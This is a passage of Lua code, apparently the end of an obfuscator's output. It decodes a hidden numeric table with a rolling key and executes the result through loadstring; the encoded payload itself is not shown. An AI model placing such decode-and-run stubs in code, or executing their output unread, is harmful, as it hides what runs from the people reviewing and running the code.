    local function VM_10Oll(d, k, m)
        local R_OI0l = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_OI0l, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_OI0l)
    end

    -- Execution Guard
    local F_10I01O = loadstring(VM_10Oll(B_0I0l11, 54, 5))
    if F_10I01O then
        F_10I01O(...)
    end
end)(...)
